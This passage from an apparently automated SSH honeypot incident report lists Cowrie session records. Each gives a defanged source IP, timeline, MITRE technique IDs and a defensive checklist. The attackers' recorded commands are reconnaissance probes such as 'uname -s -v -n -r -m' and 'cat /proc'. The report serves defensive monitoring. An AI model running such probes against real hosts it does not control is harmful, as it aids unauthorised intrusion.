**Recommended Actions:**
- [ ] Submit `223.109.143[.]238` to AbuseIPDB if not already reported
- [ ] Block `223.109.143[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ffce3b0dd8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 12:56 |
| **Last Seen** | 2026-06-25 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 12:56:48` | `cowrie.session.connect` |
| `2026-06-25 12:56:48` | `cowrie.client.version` |
| `2026-06-25 12:56:48` | `cowrie.client.kex` |
| `2026-06-25 12:56:48` | `cowrie.login.success` |
| `2026-06-25 12:56:49` | `cowrie.session.params` |
| `2026-06-25 12:56:49` | `cowrie.command.input` |
| `2026-06-25 12:56:49` | `cowrie.log.closed` |
| `2026-06-25 12:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25db32cf34ab

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 12:57 |
| **Last Seen** | 2026-06-25 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 12:57:44` | `cowrie.session.connect` |
| `2026-06-25 12:57:44` | `cowrie.client.version` |
| `2026-06-25 12:57:44` | `cowrie.client.kex` |
| `2026-06-25 12:57:44` | `cowrie.login.success` |
| `2026-06-25 12:57:45` | `cowrie.session.params` |
| `2026-06-25 12:57:45` | `cowrie.command.input` |
| `2026-06-25 12:57:45` | `cowrie.log.closed` |
| `2026-06-25 12:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad58ecbe881

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 12:58 |
| **Last Seen** | 2026-06-25 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 12:58:38` | `cowrie.session.connect` |
| `2026-06-25 12:58:38` | `cowrie.client.version` |
| `2026-06-25 12:58:38` | `cowrie.client.kex` |
| `2026-06-25 12:58:39` | `cowrie.login.success` |
| `2026-06-25 12:58:39` | `cowrie.session.params` |
| `2026-06-25 12:58:39` | `cowrie.command.input` |
| `2026-06-25 12:58:40` | `cowrie.log.closed` |
| `2026-06-25 12:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6669d936c05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 12:59 |
| **Last Seen** | 2026-06-25 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 12:59:33` | `cowrie.session.connect` |
| `2026-06-25 12:59:33` | `cowrie.client.version` |
| `2026-06-25 12:59:33` | `cowrie.client.kex` |
| `2026-06-25 12:59:33` | `cowrie.login.success` |
| `2026-06-25 12:59:34` | `cowrie.session.params` |
| `2026-06-25 12:59:34` | `cowrie.command.input` |
| `2026-06-25 12:59:34` | `cowrie.log.closed` |
| `2026-06-25 12:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ff4a3c7b559

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:00 |
| **Last Seen** | 2026-06-25 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:00:27` | `cowrie.session.connect` |
| `2026-06-25 13:00:27` | `cowrie.client.version` |
| `2026-06-25 13:00:28` | `cowrie.client.kex` |
| `2026-06-25 13:00:28` | `cowrie.login.success` |
| `2026-06-25 13:00:28` | `cowrie.session.params` |
| `2026-06-25 13:00:28` | `cowrie.command.input` |
| `2026-06-25 13:00:29` | `cowrie.log.closed` |
| `2026-06-25 13:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4dbb0e526d3

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-06-25 13:00 |
| **Last Seen** | 2026-06-25 13:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, busybox TEST, cat /proc, /` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:00:33` | `cowrie.session.connect` |
| `2026-06-25 13:00:35` | `cowrie.login.success` |
| `2026-06-25 13:00:36` | `cowrie.session.params` |
| `2026-06-25 13:00:36` | `cowrie.command.input` |
| `2026-06-25 13:00:37` | `cowrie.command.input` |
| `2026-06-25 13:00:38` | `cowrie.command.input` |
| `2026-06-25 13:00:39` | `cowrie.command.input` |
| `2026-06-25 13:00:39` | `cowrie.log.closed` |
| `2026-06-25 13:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b343edc4d887

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:01 |
| **Last Seen** | 2026-06-25 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:01:24` | `cowrie.session.connect` |
| `2026-06-25 13:01:24` | `cowrie.client.version` |
| `2026-06-25 13:01:24` | `cowrie.client.kex` |
| `2026-06-25 13:01:24` | `cowrie.login.success` |
| `2026-06-25 13:01:25` | `cowrie.session.params` |
| `2026-06-25 13:01:25` | `cowrie.command.input` |
| `2026-06-25 13:01:25` | `cowrie.log.closed` |
| `2026-06-25 13:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05db0a73947

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:02 |
| **Last Seen** | 2026-06-25 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:02:19` | `cowrie.session.connect` |
| `2026-06-25 13:02:19` | `cowrie.client.version` |
| `2026-06-25 13:02:20` | `cowrie.client.kex` |
| `2026-06-25 13:02:20` | `cowrie.login.success` |
| `2026-06-25 13:02:21` | `cowrie.session.params` |
| `2026-06-25 13:02:21` | `cowrie.command.input` |
| `2026-06-25 13:02:21` | `cowrie.log.closed` |
| `2026-06-25 13:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f855b99d301b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:03 |
| **Last Seen** | 2026-06-25 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:03:20` | `cowrie.session.connect` |
| `2026-06-25 13:03:20` | `cowrie.client.version` |
| `2026-06-25 13:03:20` | `cowrie.client.kex` |
| `2026-06-25 13:03:21` | `cowrie.login.success` |
| `2026-06-25 13:03:22` | `cowrie.session.params` |
| `2026-06-25 13:03:22` | `cowrie.command.input` |
| `2026-06-25 13:03:22` | `cowrie.log.closed` |
| `2026-06-25 13:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9acf24eff21b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:04 |
| **Last Seen** | 2026-06-25 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:04:21` | `cowrie.session.connect` |
| `2026-06-25 13:04:21` | `cowrie.client.version` |
| `2026-06-25 13:04:21` | `cowrie.client.kex` |
| `2026-06-25 13:04:21` | `cowrie.login.success` |
| `2026-06-25 13:04:22` | `cowrie.session.params` |
| `2026-06-25 13:04:22` | `cowrie.command.input` |
| `2026-06-25 13:04:22` | `cowrie.log.closed` |
| `2026-06-25 13:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18dc1c1bf7c1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:05 |
| **Last Seen** | 2026-06-25 13:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:05:20` | `cowrie.session.connect` |
| `2026-06-25 13:05:20` | `cowrie.client.version` |
| `2026-06-25 13:05:20` | `cowrie.client.kex` |
| `2026-06-25 13:05:21` | `cowrie.login.success` |
| `2026-06-25 13:05:22` | `cowrie.session.params` |
| `2026-06-25 13:05:22` | `cowrie.command.input` |
| `2026-06-25 13:05:22` | `cowrie.log.closed` |
| `2026-06-25 13:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f2203528ddf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:06 |
| **Last Seen** | 2026-06-25 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:06:15` | `cowrie.session.connect` |
| `2026-06-25 13:06:15` | `cowrie.client.version` |
| `2026-06-25 13:06:15` | `cowrie.client.kex` |
| `2026-06-25 13:06:16` | `cowrie.login.success` |
| `2026-06-25 13:06:17` | `cowrie.session.params` |
| `2026-06-25 13:06:17` | `cowrie.command.input` |
| `2026-06-25 13:06:17` | `cowrie.log.closed` |
| `2026-06-25 13:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b7c5ae66c8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:07 |
| **Last Seen** | 2026-06-25 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:07:09` | `cowrie.session.connect` |
| `2026-06-25 13:07:09` | `cowrie.client.version` |
| `2026-06-25 13:07:09` | `cowrie.client.kex` |
| `2026-06-25 13:07:10` | `cowrie.login.success` |
| `2026-06-25 13:07:10` | `cowrie.session.params` |
| `2026-06-25 13:07:10` | `cowrie.command.input` |
| `2026-06-25 13:07:11` | `cowrie.log.closed` |
| `2026-06-25 13:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-678700ae146e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:08 |
| **Last Seen** | 2026-06-25 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:08:05` | `cowrie.session.connect` |
| `2026-06-25 13:08:05` | `cowrie.client.version` |
| `2026-06-25 13:08:06` | `cowrie.client.kex` |
| `2026-06-25 13:08:06` | `cowrie.login.success` |
| `2026-06-25 13:08:07` | `cowrie.session.params` |
| `2026-06-25 13:08:07` | `cowrie.command.input` |
| `2026-06-25 13:08:07` | `cowrie.log.closed` |
| `2026-06-25 13:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c454fe2d6665

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:09 |
| **Last Seen** | 2026-06-25 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:09:04` | `cowrie.session.connect` |
| `2026-06-25 13:09:04` | `cowrie.client.version` |
| `2026-06-25 13:09:05` | `cowrie.client.kex` |
| `2026-06-25 13:09:05` | `cowrie.login.success` |
| `2026-06-25 13:09:05` | `cowrie.session.params` |
| `2026-06-25 13:09:05` | `cowrie.command.input` |
| `2026-06-25 13:09:06` | `cowrie.log.closed` |
| `2026-06-25 13:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72927c1bb26d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:10 |
| **Last Seen** | 2026-06-25 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:10:02` | `cowrie.session.connect` |
| `2026-06-25 13:10:02` | `cowrie.client.version` |
| `2026-06-25 13:10:02` | `cowrie.client.kex` |
| `2026-06-25 13:10:03` | `cowrie.login.success` |
| `2026-06-25 13:10:03` | `cowrie.session.params` |
| `2026-06-25 13:10:03` | `cowrie.command.input` |
| `2026-06-25 13:10:04` | `cowrie.log.closed` |
| `2026-06-25 13:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a69bc73064

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:11 |
| **Last Seen** | 2026-06-25 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:11:00` | `cowrie.session.connect` |
| `2026-06-25 13:11:00` | `cowrie.client.version` |
| `2026-06-25 13:11:00` | `cowrie.client.kex` |
| `2026-06-25 13:11:00` | `cowrie.login.success` |
| `2026-06-25 13:11:01` | `cowrie.session.params` |
| `2026-06-25 13:11:01` | `cowrie.command.input` |
| `2026-06-25 13:11:01` | `cowrie.log.closed` |
| `2026-06-25 13:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad97707dae27

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:11 |
| **Last Seen** | 2026-06-25 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:11:58` | `cowrie.session.connect` |
| `2026-06-25 13:11:58` | `cowrie.client.version` |
| `2026-06-25 13:11:58` | `cowrie.client.kex` |
| `2026-06-25 13:11:58` | `cowrie.login.success` |
| `2026-06-25 13:11:59` | `cowrie.session.params` |
| `2026-06-25 13:11:59` | `cowrie.command.input` |
| `2026-06-25 13:11:59` | `cowrie.log.closed` |
| `2026-06-25 13:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7d3d504383

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:12 |
| **Last Seen** | 2026-06-25 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:12:55` | `cowrie.session.connect` |
| `2026-06-25 13:12:55` | `cowrie.client.version` |
| `2026-06-25 13:12:55` | `cowrie.client.kex` |
| `2026-06-25 13:12:56` | `cowrie.login.success` |
| `2026-06-25 13:12:57` | `cowrie.session.params` |
| `2026-06-25 13:12:57` | `cowrie.command.input` |
| `2026-06-25 13:12:57` | `cowrie.log.closed` |
| `2026-06-25 13:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14566a2bc52

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:13 |
| **Last Seen** | 2026-06-25 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:13:51` | `cowrie.session.connect` |
| `2026-06-25 13:13:51` | `cowrie.client.version` |
| `2026-06-25 13:13:51` | `cowrie.client.kex` |
| `2026-06-25 13:13:51` | `cowrie.login.success` |
| `2026-06-25 13:13:52` | `cowrie.session.params` |
| `2026-06-25 13:13:52` | `cowrie.command.input` |
| `2026-06-25 13:13:52` | `cowrie.log.closed` |
| `2026-06-25 13:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c6b76388bf

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:14 |
| **Last Seen** | 2026-06-25 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:14:49` | `cowrie.session.connect` |
| `2026-06-25 13:14:49` | `cowrie.client.version` |
| `2026-06-25 13:14:49` | `cowrie.client.kex` |
| `2026-06-25 13:14:49` | `cowrie.login.success` |
| `2026-06-25 13:14:50` | `cowrie.session.params` |
| `2026-06-25 13:14:50` | `cowrie.command.input` |
| `2026-06-25 13:14:50` | `cowrie.log.closed` |
| `2026-06-25 13:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4058000b1d6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:15 |
| **Last Seen** | 2026-06-25 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:15:48` | `cowrie.session.connect` |
| `2026-06-25 13:15:48` | `cowrie.client.version` |
| `2026-06-25 13:15:48` | `cowrie.client.kex` |
| `2026-06-25 13:15:49` | `cowrie.login.success` |
| `2026-06-25 13:15:49` | `cowrie.session.params` |
| `2026-06-25 13:15:49` | `cowrie.command.input` |
| `2026-06-25 13:15:50` | `cowrie.log.closed` |
| `2026-06-25 13:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d067694cf4ef

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:16 |
| **Last Seen** | 2026-06-25 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:16:47` | `cowrie.session.connect` |
| `2026-06-25 13:16:47` | `cowrie.client.version` |
| `2026-06-25 13:16:47` | `cowrie.client.kex` |
| `2026-06-25 13:16:48` | `cowrie.login.success` |
| `2026-06-25 13:16:49` | `cowrie.session.params` |
| `2026-06-25 13:16:49` | `cowrie.command.input` |
| `2026-06-25 13:16:49` | `cowrie.log.closed` |
| `2026-06-25 13:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd3d1457363

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:17 |
| **Last Seen** | 2026-06-25 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:17:46` | `cowrie.session.connect` |
| `2026-06-25 13:17:46` | `cowrie.client.version` |
| `2026-06-25 13:17:46` | `cowrie.client.kex` |
| `2026-06-25 13:17:47` | `cowrie.login.success` |
| `2026-06-25 13:17:47` | `cowrie.session.params` |
| `2026-06-25 13:17:47` | `cowrie.command.input` |
| `2026-06-25 13:17:47` | `cowrie.log.closed` |
| `2026-06-25 13:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-948ff5a53c04

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:18 |
| **Last Seen** | 2026-06-25 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:18:42` | `cowrie.session.connect` |
| `2026-06-25 13:18:42` | `cowrie.client.version` |
| `2026-06-25 13:18:42` | `cowrie.client.kex` |
| `2026-06-25 13:18:43` | `cowrie.login.success` |
| `2026-06-25 13:18:44` | `cowrie.session.params` |
| `2026-06-25 13:18:44` | `cowrie.command.input` |
| `2026-06-25 13:18:44` | `cowrie.log.closed` |
| `2026-06-25 13:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fa54ae00181

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:19 |
| **Last Seen** | 2026-06-25 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
